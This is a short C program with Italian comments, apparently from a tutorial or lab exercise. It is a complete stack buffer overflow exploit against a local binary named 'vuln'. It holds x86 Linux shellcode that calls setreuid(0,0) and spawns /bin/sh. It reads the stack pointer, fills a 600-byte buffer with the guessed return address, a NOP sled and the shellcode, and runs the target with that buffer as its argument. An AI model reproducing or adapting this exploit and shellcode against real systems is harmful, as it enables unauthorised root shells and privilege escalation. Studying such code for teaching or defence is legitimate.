#include <stdlib.h>
#include <stdio.h>

char shellcode[] = 
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68";

//funzione che restituisce lo stack-pointer
unsigned long sp(void){
    __asm__("movl %esp, %eax");   //esp = stack pointer
}   

int main(int argc, char *argv[]){
    int i;
    int offset;
    long esp;
    long ret;
    long *addr_ptr;
    char *buffer;
    char *ptr;

    offset = 0; //perche il primo elemento dello stack Ã¨ il buffer (in vuln)
    esp = sp(); //inserisco lo stack pointer

    ret = esp - offset; //sovrascizione dell'indirizzo di ritorno

    printf("Stack Pointer (ESP)    : 0x%x\n", esp);
    printf("Offset from ESP        : 0x%x\n", offset);
    printf("Addr Return desiderato : 0x%x\n", ret);

    buffer = malloc(600); //allocazione di 600 byte nello heap

    //riempimento dell'intero buffer con l'indirizzo di ritorno desiderato
    ptr = buffer;
    addr_ptr = (long *) ptr;
    for(i = 0; i < 600; i+=4){
	*(addr_ptr++) = ret;
    }

    //riempimento dei primi 200 byte del buffer con istruzioni nop
    for(i = 0; i < 200; i++){
	buffer[i] = '\x90';
    }


    //inserimento dello shellcode dopo i nop
    ptr = buffer + 220; 
    for(i = 0; i < strlen(shellcode); i++){
	*(ptr++) = shellcode[i];
    }

    //fine stringa
    buffer[600-1] = 0;

    //si richiama il programma vulnerabile con il buffer manipolato come argomento
    execl("./vuln", "vuln", buffer, 0); 

    //si libera la memoria del buffer
    free(buffer);

    return 0;
}
